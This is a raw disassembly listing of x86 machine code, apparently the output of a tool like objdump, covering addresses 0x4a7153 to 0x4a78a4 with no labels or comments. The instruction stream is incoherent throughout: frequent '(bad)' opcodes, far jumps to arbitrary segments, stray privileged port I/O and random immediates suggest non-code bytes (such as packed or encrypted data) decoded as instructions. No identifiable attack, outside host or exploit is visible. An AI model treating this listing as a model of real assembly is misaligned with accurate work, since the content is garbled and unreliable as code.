  4a7153:	shl    BYTE PTR [ebp+0x33f40794],cl
  4a7159:	shr    bl,0x45
  4a715c:	add    ecx,DWORD PTR [ebx-0x2bd61f4b]
  4a7162:	xchg   BYTE PTR [eax+0x739f43d6],dh
  4a7168:	push   edi
  4a7169:	test   BYTE PTR [eax-0x5a],bl
  4a716c:	in     al,dx
  4a716d:	push   0x7ecf629
  4a7172:	(bad)  
  4a7173:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a7174:	ret    0x52c
  4a7177:	jne    0x4a7119
  4a7179:	daa    
  4a717a:	dec    edx
  4a717b:	dec    ebp
  4a717c:	sbb    al,0x4b
  4a717e:	mov    ecx,0x37a822a8
  4a7183:	test   DWORD PTR [eax],edi
  4a7185:	mov    dh,0x50
  4a7187:	les    esi,FWORD PTR [eax+0xd4b152f]
  4a718d:	xor    cl,BYTE PTR [ecx-0x7fce0aec]
  4a7193:	jmp    0xcf79:0x4bd9622e
  4a719a:	pop    edi
  4a719b:	pusha  
  4a719c:	mov    ds:0x88a3229d,eax
  4a71a1:	int3   
  4a71a2:	cmp    DWORD PTR [ecx+0x3c],ebx
  4a71a5:	jbe    0x4a71de
  4a71a7:	or     BYTE PTR [ecx-0x6396ef87],bh
  4a71ad:	or     al,0x98
  4a71af:	push   ecx
  4a71b0:	pusha  
  4a71b1:	(bad)  
  4a71b2:	fsubrp st(4),st
  4a71b4:	adc    edx,DWORD PTR [ebx+eax*2-0x5c]
  4a71b8:	cmp    ebx,DWORD PTR [edx+0x3c]
  4a71bb:	jb     0x4a7186
  4a71bd:	test   eax,0x10b5600e
  4a71c2:	dec    ebp
  4a71c3:	jnp    0x4a71d8
  4a71c5:	and    DWORD PTR [esi+eiz*4+0x1e],edx
  4a71c9:	push   esi
  4a71ca:	popa   
  4a71cb:	int3   
  4a71cc:	add    ebx,DWORD PTR [eax+0x72]
  4a71cf:	inc    esi
  4a71d0:	pop    ebp
  4a71d1:	and    al,0x56
  4a71d3:	mov    ch,0x3
  4a71d5:	xchg   esp,eax
  4a71d6:	sbb    eax,0xdce4a00f
  4a71db:	mov    bl,0x6a
  4a71dd:	mov    eax,0xd6032553
  4a71e2:	sbb    BYTE PTR [edi],cl
  4a71e4:	retf   
  4a71e5:	les    edx,FWORD PTR [edx-0x7c7771b7]
  4a71eb:	or     al,0x22
  4a71ed:	add    al,0xd
  4a71ef:	push   0x64c04b63
  4a71f4:	xlat   BYTE PTR ds:[ebx]
  4a71f5:	pop    eax
  4a71f6:	pop    es
  4a71f7:	out    dx,eax
  4a71f8:	mov    ecx,0x580bad23
  4a71fd:	push   ebx
  4a71fe:	shl    BYTE PTR [edi],1
  4a7200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a7201:	mov    al,ds:0xd1d9480e
  4a7207:	inc    eax
  4a7208:	push   eax
  4a7209:	add    al,0x96
  4a720b:	mov    dl,BYTE PTR [eax]
  4a720d:	mov    ecx,0x4e151d4e
  4a7212:	push   ebx
  4a7213:	cmp    al,BYTE PTR [ecx+0x51]
  4a7216:	mov    cl,0x61
  4a7218:	adc    eax,0x37006190
  4a721d:	call   FWORD PTR [eax+0x7fa19765]
  4a7223:	xor    eax,0x9d164957
  4a7228:	or     BYTE PTR [ecx+0x60],al
  4a722b:	pop    es
  4a722c:	mov    edx,DWORD PTR [esi]
  4a722e:	mov    al,ds:0x30da1bc2
  4a7233:	cmp    cl,cl
  4a7235:	pop    ebx
  4a7236:	inc    ebp
  4a7237:	loop   0x4a7223
  4a7239:	jl     0x4a7255
  4a723b:	inc    ecx
  4a723c:	mov    bh,bh
  4a723e:	pop    ebx
  4a723f:	jbe    0x4a7275
  4a7241:	mov    ebx,ds
  4a7243:	jp     0x4a7251
  4a7245:	sbb    dl,BYTE PTR [edi]
  4a7247:	jge    0x4a7233
  4a7249:	mov    ds:0x1658e2f9,al
  4a724e:	fidivr WORD PTR [esi+0x2c]
  4a7251:	lods   al,BYTE PTR ds:[esi]
  4a7252:	lea    eax,[ecx+0x3aa51950]
  4a7258:	cmp    al,0x2c
  4a725a:	ins    DWORD PTR es:[edi],dx
  4a725b:	out    dx,eax
  4a725c:	mov    dh,BYTE PTR [esi+0x35a1151]
  4a7262:	lock inc edi
  4a7264:	ds jg  0x4a724d
  4a7267:	pop    edx
  4a7268:	cmp    ah,BYTE PTR [edi]
  4a726a:	icebp  
  4a726b:	sar    BYTE PTR [edx],1
  4a726d:	and    eax,0xb1843889
  4a7272:	or     DWORD PTR [ebx+edi*8-0xdc3734e],ebp
  4a7279:	or     al,0x43
  4a727b:	ror    cl,0x12
  4a727e:	cmp    edx,0xffffffca
  4a7281:	add    BYTE PTR [edx+0x218d0021],bh
  4a7287:	sub    eax,ecx
  4a7289:	or     cl,BYTE PTR [edi-0x50]
  4a728c:	and    esp,DWORD PTR [edx]
  4a728e:	dec    ecx
  4a728f:	mov    ebp,0x82e8754f
  4a7294:	rcl    BYTE PTR [esi+0xc],1
  4a7297:	enter  0xa304,0x63
  4a729b:	dec    ecx
  4a729c:	sbb    edx,DWORD PTR [esi-0x3d]
  4a729f:	mov    edx,edi
  4a72a1:	cmp    BYTE PTR [ecx+edi*4],ah
  4a72a4:	test   al,0xb0
  4a72a6:	stos   DWORD PTR es:[edi],eax
  4a72a7:	call   0xc06eab4c
  4a72ac:	add    al,0xc4
  4a72ae:	jo     0x4a732b
  4a72b0:	mov    esi,0x3908e601
  4a72b5:	push   esp
  4a72b6:	jle    0x219bb5f8
  4a72bc:	and    bl,bh
  4a72be:	xor    bh,BYTE PTR [edx]
  4a72c0:	mov    bh,dl
  4a72c2:	mov    ch,0x20
  4a72c4:	xchg   esi,eax
  4a72c5:	inc    eax
  4a72c6:	pcmpeqb mm7,mm0
  4a72c9:	cmp    dl,bh
  4a72cb:	mov    ch,0x5a
  4a72cd:	mov    ah,0x6f
  4a72cf:	adc    bh,dl
  4a72d1:	mov    ebp,0x2243215a
  4a72d6:	jo     0x4a7293
  4a72d8:	test   eax,0x8aee75c3
  4a72dd:	dec    esi
  4a72de:	mov    edx,0xbda4687c
  4a72e3:	pusha  
  4a72e4:	cpuid  
  4a72e6:	pop    ecx
  4a72e7:	inc    ebx
  4a72e8:	jae    0x4a7302
  4a72ea:	data16 jle 0x4a7315
  4a72ed:	ss mov al,0x7d
  4a72f0:	scas   al,BYTE PTR es:[edi]
  4a72f1:	call   0xdcc3aeb0
  4a72f6:	int    0x9e
  4a72f8:	mov    ebp,0x985d90d
  4a72fd:	add    eax,ecx
  4a72ff:	xchg   edi,esi
  4a7301:	pop    ds
  4a7302:	sub    BYTE PTR [ebp+0x2],dh
  4a7305:	lea    ebx,ds:0x226e9804
  4a730b:	aaa    
  4a730c:	sbb    BYTE PTR [ecx],0x40
  4a730f:	dec    ebp
  4a7310:	push   esp
  4a7311:	in     eax,dx
  4a7312:	jmp    0x4a72d8
  4a7314:	jle    0x4a7365
  4a7316:	jmp    0xff8b:0xac61e3b
  4a731d:	xor    DWORD PTR [edx+0x29c41381],eax
  4a7323:	out    dx,al
  4a7324:	call   0x144b4b42
  4a7329:	cmp    ebx,DWORD PTR cs:[edx-0x6f]
  4a732d:	adc    BYTE PTR [eax+0x3],al
  4a7330:	mov    ebx,0xa41bc39
  4a7335:	ins    DWORD PTR es:[edi],dx
  4a7336:	or     edx,DWORD PTR [esi]
  4a7338:	js     0x4a732b
  4a733a:	dec    edi
  4a733b:	leave  
  4a733c:	pop    esp
  4a733d:	add    DWORD PTR [eax+0x28],eax
  4a7340:	add    DWORD PTR [ecx+0x2c],esp
  4a7343:	sahf   
  4a7344:	pop    edx
  4a7345:	and    DWORD PTR ds:0x8c763c24,ecx
  4a734b:	mov    WORD PTR [edi+0x35],fs
  4a734e:	mov    BYTE PTR [ebp*2-0x74fce38e],ch
  4a7355:	int3   
  4a7356:	push   ds
  4a7357:	add    DWORD PTR [esi],esp
  4a7359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a735a:	clc    
  4a735b:	aaa    
  4a735c:	sbb    al,0x96
  4a735e:	or     DWORD PTR [edx],edi
  4a7360:	or     BYTE PTR [edi+eax*8],0x86
  4a7364:	je     0x4a73ab
  4a7366:	adc    DWORD PTR [esi-0x76],esp
  4a7369:	adc    ch,cl
  4a736b:	lock push ebx
  4a736d:	stos   DWORD PTR es:[edi],eax
  4a736e:	mov    ds:0x4110c8ca,al
  4a7373:	mov    WORD PTR [ecx+ecx*4],cs
  4a7376:	inc    edx
  4a7377:	rcr    cl,1
  4a7379:	mov    ecx,0x413e126d
  4a737e:	adc    BYTE PTR [ecx-0x19eb85e1],ch
  4a7384:	rcr    BYTE PTR [ebp+0x185137d3],0x16
  4a738b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a738c:	adc    cl,bh
  4a738e:	sti    
  4a738f:	mov    esi,0x79891a9f
  4a7394:	sbb    al,0x41
  4a7396:	and    BYTE PTR [edi],dl
  4a7398:	and    al,0x79
  4a739a:	sub    BYTE PTR [ebx-0x22c102ba],cl
  4a73a0:	mov    dl,0x40
  4a73a2:	sub    al,0x2b
  4a73a4:	xor    BYTE PTR [eax+0x34427902],bh
  4a73aa:	pop    edx
  4a73ab:	cmp    DWORD PTR [edx+edx*8],esi
  4a73ae:	xchg   ecx,eax
  4a73af:	adc    esi,DWORD PTR [esi]
  4a73b1:	mov    dl,ah
  4a73b3:	icebp  
  4a73b4:	or     DWORD PTR [eax],ebx
  4a73b6:	ret    0xe69
  4a73b9:	jns    0x4a733b
  4a73bb:	outs   dx,DWORD PTR ds:[esi]
  4a73bc:	inc    ebx
  4a73bd:	xchg   edi,eax
  4a73be:	dec    eax
  4a73bf:	and    al,0x5c
  4a73c1:	inc    ebp
  4a73c2:	add    ecx,ebp
  4a73c4:	(bad)  
  4a73c5:	aaa    
  4a73c6:	enter  0x5077,0xea
  4a73ca:	cwde   
  4a73cb:	aas    
  4a73cc:	xchg   esi,eax
  4a73cd:	inc    eax
  4a73ce:	add    DWORD PTR [ebx+esi*1+0x5d],eax
  4a73d2:	sub    ebx,0x33b748de
  4a73d8:	dec    esp
  4a73d9:	scas   eax,DWORD PTR es:[edi]
  4a73da:	cmp    DWORD PTR [eax+0x1b],edx
  4a73dd:	ror    BYTE PTR [ebx],0xc4
  4a73e0:	sub    bh,BYTE PTR [edi-0x509f4576]
  4a73e6:	sbb    DWORD PTR [edi+0x5],0x29
  4a73ea:	dec    eax
  4a73eb:	push   edx
  4a73ec:	in     eax,0x1a
  4a73ee:	(bad)  
  4a73ef:	data16 (bad) 
  4a73f1:	ins    DWORD PTR es:[edi],dx
  4a73f2:	or     eax,0x48bad422
  4a73f7:	pop    ebp
  4a73f8:	add    al,0xf3
  4a73fa:	mov    ds,WORD PTR [esi+ebx*8+0x1d]
  4a73fe:	adc    eax,DWORD PTR [eax+0xc]
  4a7401:	mov    DWORD PTR [ecx],edi
  4a7403:	push   esi
  4a7404:	mov    edi,DWORD PTR [ecx+0x2c065ec1]
  4a740a:	jle    0x4a7410
  4a740c:	daa    
  4a740d:	cmp    al,0x70
  4a740f:	jo     0x4a7457
  4a7411:	jle    0x4a7467
  4a7413:	mov    eax,0xad584855
  4a7418:	repnz loope 0x4a7497
  4a741b:	shr    BYTE PTR [eax+0x5c],1
  4a741e:	sub    esp,DWORD PTR [eax+0x1]
  4a7421:	jno    0x4a7487
  4a7423:	ja     0x4a742a
  4a7425:	xchg   edi,eax
  4a7426:	sbb    al,0x68
  4a7428:	ins    BYTE PTR es:[edi],dx
  4a7429:	imul   DWORD PTR [esi-0x50]
  4a742c:	jns    0x4a749e
  4a742e:	das    
  4a742f:	add    eax,0xc8700c9a
  4a7434:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a7435:	mov    ebx,0x2f2a2574
  4a743a:	js     0x4a74b4
  4a743c:	add    ebx,ebx
  4a743e:	inc    ecx
  4a743f:	jl     0x4a73c3
  4a7441:	sub    dh,dh
  4a7443:	and    al,bh
  4a7445:	and    cl,0x89
  4a7448:	mov    eax,0x8891df84
  4a744d:	das    
  4a744e:	jnp    0x4a7452
  4a7450:	out    dx,eax
  4a7451:	ins    BYTE PTR es:[edi],dx
  4a7452:	mov    ecx,0xef8a88ad
  4a7457:	shl    ah,0x20
  4a745a:	adc    DWORD PTR [eax],esi
  4a745c:	inc    eax
  4a745d:	adc    BYTE PTR [esi],cl
  4a745f:	jl     0x4a747e
  4a7461:	pop    eax
  4a7462:	les    esp,FWORD PTR [ecx-0x520336d]
  4a7468:	leave  
  4a7469:	sbb    BYTE PTR [edx+ebp*8],dh
  4a746c:	aaa    
  4a746d:	pop    esi
  4a746e:	scas   al,BYTE PTR es:[edi]
  4a746f:	cmp    al,0xc5
  4a7471:	add    BYTE PTR [ebx+esi*2],al
  4a7474:	fistp  WORD PTR [ebx-0x7200fc1f]
  4a747a:	or     al,0x85
  4a747c:	adc    eax,0xa4601310
  4a7481:	xchg   edx,eax
  4a7482:	sbb    al,al
  4a7484:	adc    al,0x5a
  4a7486:	je     0x4a745f
  4a7488:	push   es
  4a7489:	(bad)  
  4a748a:	in     al,0xf3
  4a748c:	adc    al,0x41
  4a748e:	inc    esp
  4a748f:	jl     0x4a7506
  4a7491:	sbb    eax,0x1297eb07
  4a7496:	xor    ecx,DWORD PTR [ebp-0x10fbbeac]
  4a749c:	cmp    DWORD PTR [esi+0x13],edx
  4a749f:	lock inc ebp
  4a74a1:	mov    ecx,0x144050a2
  4a74a6:	inc    ecx
  4a74a7:	pop    ebx
  4a74a8:	add    cl,BYTE PTR [eax+0x1c4217b0]
  4a74ae:	jbe    0x4a7515
  4a74b0:	add    BYTE PTR [edx],ah
  4a74b2:	xchg   edx,eax
  4a74b3:	adc    edx,DWORD PTR [ebp+0x51]
  4a74b6:	adc    al,0xda
  4a74b8:	pop    ecx
  4a74b9:	in     al,dx
  4a74ba:	mov    ah,al
  4a74bc:	or     al,0xfc
  4a74be:	adc    al,0x81
  4a74c0:	ror    DWORD PTR [edx],0x7e
  4a74c3:	xor    BYTE PTR [edx+edi*1+0x60],cl
  4a74c7:	adc    DWORD PTR [ebp+0x44a5320c],0x39
  4a74ce:	adc    esi,esi
  4a74d0:	add    al,0xdf
  4a74d2:	out    0x3e,al
  4a74d4:	cld    
  4a74d5:	mov    eax,0x183a4481
  4a74da:	push   0xffffffd0
  4a74dc:	and    al,0x10
  4a74de:	outs   dx,DWORD PTR ds:[esi]
  4a74df:	ss adc DWORD PTR ss:[edi],edx
  4a74e3:	gs jmp 0xb088:0x7ed13684
  4a74eb:	sahf   
  4a74ec:	mov    dh,0x22
  4a74ee:	ficom  WORD PTR [edx+ecx*1]
  4a74f1:	jp     0x4a74f5
  4a74f3:	push   cs
  4a74f4:	(bad)  
  4a74f5:	jmp    0x5084:0x10a46d74
  4a74fc:	or     ah,BYTE PTR [esi+0x53]
  4a74ff:	inc    ecx
  4a7500:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a7501:	lods   al,BYTE PTR ds:[esi]
  4a7502:	(bad)  
  4a7504:	push   0xffffffc4
  4a7506:	jne    0x4a74e3
  4a7508:	push   0x1008f464
  4a750d:	(bad)  
  4a750f:	xchg   BYTE PTR [esi+0x7fc5128],al
  4a7515:	inc    edx
  4a7516:	push   eax
  4a7517:	shl    DWORD PTR [esi],0xbb
  4a751a:	push   0x9615ebf4
  4a751f:	push   ds
  4a7520:	jl     0x4a7573
  4a7522:	je     0x4a74dc
  4a7524:	or     BYTE PTR [edx+0xe],ch
  4a7527:	or     DWORD PTR [eax+edx*1+0x560de374],esp
  4a752e:	arpl   WORD PTR [ecx+0x46],sp
  4a7531:	or     BYTE PTR [ebp-0x36ade5b0],0x10
  4a7538:	scas   al,BYTE PTR es:[edi]
  4a7539:	and    al,0xa
  4a753b:	mov    ecx,DWORD PTR [esi]
  4a753d:	inc    esi
  4a753e:	and    cl,0x59
  4a7541:	add    al,0xea
  4a7543:	and    eax,0x25e5b5a
  4a7548:	fist   DWORD PTR [esi+0x7ad27539]
  4a754e:	push   esi
  4a754f:	or     bl,dh
  4a7551:	dec    esi
  4a7552:	or     BYTE PTR [eax-0x4494b313],ah
  4a7558:	add    al,0xa
  4a755a:	push   esi
  4a755b:	fwait
  4a755c:	mov    ah,0x2
  4a755e:	jne    0x4a75ad
  4a7560:	dec    ebp
  4a7561:	ret    0xda50
  4a7564:	inc    ebp
  4a7565:	adc    al,0x69
  4a7567:	rcl    DWORD PTR [eax],0xe4
  4a756a:	pop    es
  4a756b:	cs stos DWORD PTR es:[edi],eax
  4a756d:	shl    BYTE PTR [edx],cl
  4a756f:	sar    eax,1
  4a7571:	mov    ebp,ebx
  4a7573:	mov    al,ds:0xac621c09
  4a7578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a7579:	push   eax
  4a757a:	js     0x4a755b
  4a757c:	add    eax,0x6787071f
  4a7581:	(bad)  
  4a7582:	mov    edx,DWORD PTR [ecx+edx*1]
  4a7585:	cmp    al,0xf2
  4a7587:	retf   0x88f9
  4a758a:	or     ebp,DWORD PTR [edx+edi*2]
  4a758d:	and    BYTE PTR [esp+edx*2],al
  4a7590:	add    al,0xc8
  4a7592:	mov    ch,0x3d
  4a7594:	sar    BYTE PTR [eax+0x6f411012],0x8e
  4a759b:	mov    dh,0x61
  4a759d:	mov    al,0x32
  4a759f:	in     al,0x42
  4a75a1:	mov    ch,0x43
  4a75a3:	fiadd  WORD PTR [edx]
  4a75a5:	test   bl,0x14
  4a75a8:	push   ecx
  4a75a9:	inc    edx
  4a75aa:	jne    0x4a7556
  4a75ac:	push   eax
  4a75ad:	pop    DWORD PTR [eax+0x45]
  4a75b0:	out    0xec,al
  4a75b2:	xchg   DWORD PTR [edi],ebx
  4a75b4:	iret   
  4a75b5:	or     al,0x8
  4a75b7:	test   BYTE PTR [ebx+ebp*8],0x18
  4a75bb:	push   ss
  4a75bc:	and    edi,DWORD PTR [edi+eiz*2]
  4a75bf:	inc    ebx
  4a75c0:	pusha  
  4a75c1:	xchg   ecx,eax
  4a75c2:	adc    BYTE PTR [edx],dl
  4a75c4:	call   0x65b4c06e
  4a75c9:	call   0xe87c5623
  4a75ce:	fist   DWORD PTR [ecx-0x46]
  4a75d1:	pop    ebx
  4a75d2:	(bad)  
  4a75d3:	rcl    DWORD PTR [eax+ecx*2+0x2],1
  4a75d7:	and    bl,BYTE PTR [esi]
  4a75d9:	(bad)  
  4a75da:	sbb    al,0xbb
  4a75dc:	ds sub eax,0x40ec1c6c
  4a75e2:	ins    BYTE PTR es:[edi],dx
  4a75e3:	ret    
  4a75e4:	loopne 0x4a75d5
  4a75e6:	std    
  4a75e7:	adc    BYTE PTR [ecx],0x10
  4a75ea:	xor    ah,BYTE PTR [ebx-0x5786acf1]
  4a75f0:	mov    cl,al
  4a75f2:	or     BYTE PTR [edx+0x3a117c6],ch
  4a75f8:	inc    ebx
  4a75f9:	pushf  
  4a75fa:	add    bl,BYTE PTR [ebx+0x52]
  4a75fd:	xor    edi,DWORD PTR [esi]
  4a75ff:	add    ecx,DWORD PTR [eax]
  4a7601:	inc    edi
  4a7602:	and    edx,DWORD PTR cs:[ebx-0x40]
  4a7606:	pop    esp
  4a7607:	nop
  4a7608:	iret   
  4a7609:	sbb    ah,dl
  4a760b:	nop
  4a760c:	push   esp
  4a760d:	xor    BYTE PTR [eax],cl
  4a760f:	add    bh,0x84
  4a7612:	rol    DWORD PTR ds:0xb007ba29,1
  4a7618:	xchg   esp,eax
  4a7619:	test   BYTE PTR [ebx+ebx*4],cl
  4a761c:	mov    eax,ds:0x9e3a8280
  4a7621:	in     al,0xce
  4a7623:	jmp    0xb7070bee
  4a7628:	pop    ebp
  4a7629:	stos   DWORD PTR es:[edi],eax
  4a762a:	dec    esi
  4a762b:	push   0x88207851
  4a7630:	les    eax,FWORD PTR [ecx]
  4a7632:	mov    eax,ds:0x48438007
  4a7637:	inc    bl
  4a7639:	imul   ebx,ebx,0xffffff98
  4a763c:	inc    eax
  4a763d:	shl    BYTE PTR [edi],cl
  4a763f:	push   ss
  4a7640:	jp     0x4a7644
  4a7642:	dec    ecx
  4a7643:	push   sp
  4a7645:	sub    edx,DWORD PTR [ebx+0x6a]
  4a7648:	std    
  4a7649:	sub    DWORD PTR [eax],eax
  4a764b:	pop    ds
  4a764c:	dec    eax
  4a764d:	sub    DWORD PTR [eax],edi
  4a764f:	pop    esi
  4a7650:	in     eax,0xc
  4a7652:	dec    edx
  4a7653:	int    0x5e
  4a7655:	or     BYTE PTR [esi*1-0x5f05b7eb],bh
  4a765c:	call   FWORD PTR [ebx]
  4a765e:	test   BYTE PTR [ebx+0x1d58a534],bh
  4a7664:	inc    esi
  4a7665:	jne    0x4a76aa
  4a7667:	and    cl,cl
  4a7669:	push   eax
  4a766a:	and    eax,0xe0085dfc
  4a766f:	leave  
  4a7670:	mov    edx,0x6c141fd3
  4a7675:	repnz clc 
  4a7677:	imul   ebp,DWORD PTR es:[esi+0x66],0x380883ea
  4a767f:	or     BYTE PTR [eax],dl
  4a7681:	shr    BYTE PTR [ebp+0x1c591b7b],cl
  4a7687:	out    0x2,al
  4a7689:	push   0x1
  4a768b:	and    ebp,ebp
  4a768d:	push   es
  4a768e:	sub    DWORD PTR [ebp+0x38566946],0x7b
  4a7695:	ja     0x4a770e
  4a7697:	setnp  BYTE PTR [eax+0x60]
  4a769b:	sbb    al,0x38
  4a769d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a769e:	mov    ch,0xcb
  4a76a0:	mov    bh,0x3e
  4a76a2:	por    mm2,QWORD PTR [ebx-0x25]
  4a76a6:	and    DWORD PTR [eax],ecx
  4a76a8:	inc    ecx
  4a76a9:	out    dx,eax
  4a76aa:	pop    edx
  4a76ab:	pop    edx
  4a76ac:	sbb    al,0xa
  4a76ae:	mov    edx,0xe01df175
  4a76b3:	add    bl,BYTE PTR [edx-0x1f]
  4a76b6:	pop    esi
  4a76b7:	jbe    0x4a76ed
  4a76b9:	aam    0x90
  4a76bb:	dec    esi
  4a76bc:	mov    al,0xa
  4a76be:	or     BYTE PTR [eax+0x56cdf248],cl
  4a76c4:	ret    0x6d35
  4a76c7:	xor    BYTE PTR [esp+ebp*1],dh
  4a76ca:	and    al,0x21
  4a76cc:	imul   edx,DWORD PTR [edi],0x3f46da6b
  4a76d2:	push   ds
  4a76d3:	sub    al,0x30
  4a76d5:	inc    ebp
  4a76d6:	xor    BYTE PTR [eax+ebp*1],ah
  4a76d9:	pop    es
  4a76da:	mov    eax,ds:0x33280bad
  4a76df:	sub    eax,0x5a0b5023
  4a76e4:	adc    ch,BYTE PTR [ebp-0x77]
  4a76e7:	sbb    edi,DWORD PTR [ecx]
  4a76e9:	cmc    
  4a76ea:	push   es
  4a76eb:	add    eax,0x5215f417
  4a76f0:	ins    BYTE PTR es:[edi],dx
  4a76f1:	int3   
  4a76f2:	mov    ch,0x53
  4a76f4:	adc    dl,BYTE PTR [edx-0x29]
  4a76f7:	pop    edx
  4a76f8:	jp     0x4a7751
  4a76fa:	mov    DWORD PTR ds:0x437184ff,eax
  4a7700:	or     BYTE PTR [ecx],bh
  4a7702:	xor    al,0x73
  4a7704:	xor    BYTE PTR [ebx+eax*1+0x74],cl
  4a7708:	push   ecx
  4a7709:	in     eax,0xf8
  4a770b:	mov    edi,0x708a8508
  4a7710:	dec    edx
  4a7711:	shr    BYTE PTR [esi+0x16],0x46
  4a7715:	push   ds
  4a7716:	mov    BYTE PTR [ecx-0x5b],ch
  4a7719:	shr    BYTE PTR [edi],1
  4a771b:	arpl   WORD PTR [ebx+0x10],di
  4a771e:	or     ah,BYTE PTR ss:[ecx+0x1b5a24ef]
  4a7725:	test   eax,0x140513b1
  4a772a:	adc    eax,0xaf069182
  4a772f:	stos   BYTE PTR es:[edi],al
  4a7730:	adc    BYTE PTR [esi-0x37],bl
  4a7733:	or     al,0x7f
  4a7735:	adc    al,0x7f
  4a7737:	nop
  4a7738:	xchg   ebx,eax
  4a7739:	lock rol esp,1
  4a773c:	cmp    BYTE PTR [edi+0xc],cl
  4a773f:	push   edi
  4a7740:	mov    ds:0x6f7de56c,al
  4a7745:	push   eax
  4a7746:	loop   0x4a778c
  4a7748:	inc    edi
  4a7749:	and    al,0x14
  4a774b:	jmp    0xd1671957
  4a7750:	call   0xb5e8:0x87c6c29e
  4a7757:	and    cl,BYTE PTR [edx+0x2b]
  4a775a:	cmp    BYTE PTR [ebp-0x5b147ee3],bh
  4a7760:	dec    ebx
  4a7761:	or     al,0xe1
  4a7763:	dec    eax
  4a7764:	and    eax,0x6c8c44f1
  4a7769:	outs   dx,DWORD PTR ds:[esi]
  4a776a:	lea    eax,[esi+0x24]
  4a776d:	mov    edi,0x7a42eca0
  4a7772:	je     0x4a77a0
  4a7774:	out    0x3e,eax
  4a7776:	clc    
  4a7777:	mov    ch,BYTE PTR [eax+0x44594e0d]
  4a777d:	xchg   edx,eax
  4a777e:	xchg   BYTE PTR [edx+0x49],ah
  4a7781:	jb     0x4a77e9
  4a7783:	test   al,0xfb
  4a7785:	inc    ebx
  4a7786:	inc    ebx
  4a7787:	cmp    BYTE PTR [esi+0x3fd17f19],0xa4
  4a778e:	out    0x1b,eax
  4a7790:	push   edi
  4a7791:	push   0x53
  4a7793:	and    edx,edx
  4a7795:	inc    ebx
  4a7796:	or     BYTE PTR [ecx+0x22],bl
  4a7799:	push   ss
  4a779a:	add    DWORD PTR [ebx],ebx
  4a779c:	cmp    al,0x3c
  4a779e:	dec    ecx
  4a779f:	loop   0x4a7809
  4a77a1:	ja     0x4a777d
  4a77a3:	test   DWORD PTR [eax],ecx
  4a77a5:	or     DWORD PTR [ecx+ebx*1-0x25],ecx
  4a77a9:	int    0xcf
  4a77ab:	mov    ds:0x726e7097,al
  4a77b0:	test   BYTE PTR [ecx+0x1bff859e],0x8a
  4a77b7:	xor    BYTE PTR [edx+ebx*1-0x63],bl
  4a77bb:	push   esp
  4a77bc:	or     DWORD PTR [ebx+0x69],esp
  4a77bf:	jmp    0xfd53:0x8a0e6db
  4a77c6:	ins    BYTE PTR es:[edi],dx
  4a77c7:	div    DWORD PTR [edx-0x19]
  4a77ca:	push   esp
  4a77cb:	jge    0x4a77e2
  4a77cd:	rcl    ecx,0x78
  4a77d0:	push   edx
  4a77d1:	jne    0x4a7795
  4a77d3:	adc    esp,eax
  4a77d5:	ror    DWORD PTR [ebx+0x54479aab],0x54
  4a77dc:	push   ss
  4a77dd:	pop    es
  4a77de:	xor    bh,BYTE PTR [edx]
  4a77e0:	test   BYTE PTR [ebx+0xe55934f],dh
  4a77e6:	push   eax
  4a77e7:	es or  al,0x9d
  4a77ea:	add    al,ah
  4a77ec:	inc    ebp
  4a77ed:	mov    esi,0xb014f9e2
  4a77f2:	int3   
  4a77f3:	xor    BYTE PTR [ecx-0x3],dl
  4a77f6:	dec    esp
  4a77f7:	pop    edx
  4a77f8:	inc    eax
  4a77f9:	sbb    al,0xe4
  4a77fb:	jmp    0x4a77ee
  4a77fd:	dec    edi
  4a77fe:	popf   
  4a77ff:	lods   al,BYTE PTR ds:[esi]
  4a7800:	mov    DWORD PTR [ebx+0x2275a94f],edx
  4a7806:	and    bh,BYTE PTR [ebx-0x21]
  4a7809:	adc    bl,BYTE PTR [ecx+edx*8+0x1b]
  4a780d:	xchg   esp,eax
  4a780e:	adc    al,0x13
  4a7810:	and    BYTE PTR [eax+esi*2-0x66],0x9a
  4a7815:	inc    ebx
  4a7816:	jne    0x4a77fa
  4a7818:	pop    ecx
  4a7819:	jmp    0x7a2d3f24
  4a781e:	inc    edx
  4a781f:	dec    edi
  4a7820:	jne    0x4a77b3
  4a7822:	sbb    al,al
  4a7824:	add    DWORD PTR [ebp+0xa],edx
  4a7827:	popa   
  4a7828:	xchg   edx,eax
  4a7829:	lea    esp,[ebx]
  4a782b:	sbb    BYTE PTR [ecx-0x3d],0x47
  4a782f:	bound  eax,QWORD PTR [ebp-0x50]
  4a7832:	sub    al,0x8b
  4a7834:	iret   
  4a7835:	push   ebp
  4a7836:	xchg   edx,eax
  4a7837:	inc    edx
  4a7838:	and    esi,DWORD PTR [ecx+0x75]
  4a783b:	and    eax,0x29372831
  4a7840:	cmp    al,BYTE PTR [edi+esi*2]
  4a7843:	lds    ebx,FWORD PTR [ebp+0x575c28f6]
  4a7849:	and    ecx,DWORD PTR [edx]
  4a784b:	xor    BYTE PTR [esi+esi*1-0x72],ah
  4a784f:	inc    ecx
  4a7850:	pop    ebp
  4a7851:	ret    0x4a9f
  4a7854:	mov    ds:0xc5519905,eax
  4a7859:	jne    0x4a7885
  4a785b:	inc    DWORD PTR [esi-0x40e6e1ce]
  4a7861:	xor    BYTE PTR [edx+0x3b],ch
  4a7864:	mov    esi,0x8b1c40d8
  4a7869:	xor    eax,0xbb41c010
  4a786e:	int3   
  4a786f:	shl    DWORD PTR [ecx+0x49e06694],cl
  4a7875:	ret    0xf13b
  4a7878:	cmp    BYTE PTR [edx-0x5f],dl
  4a787b:	inc    ebp
  4a787c:	(bad)  
  4a787d:	dec    ebx
  4a787e:	adc    eax,0x44892a94
  4a7883:	xor    eax,0xa00c04ef
  4a7888:	xchg   DWORD PTR [edx],eax
  4a788a:	test   BYTE PTR [ebx+0x20],al
  4a788d:	shl    DWORD PTR [ebx+0x2ca652a0],1
  4a7893:	pop    eax
  4a7894:	add    DWORD PTR [ebx+ebp*2],esp
  4a7897:	ins    DWORD PTR es:[edi],dx
  4a7898:	aaa    
  4a7899:	add    al,0x29
  4a789b:	ds and eax,0x5551fd9f
  4a78a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a78a2:	and    cl,al
  4a78a4:	inc    eax
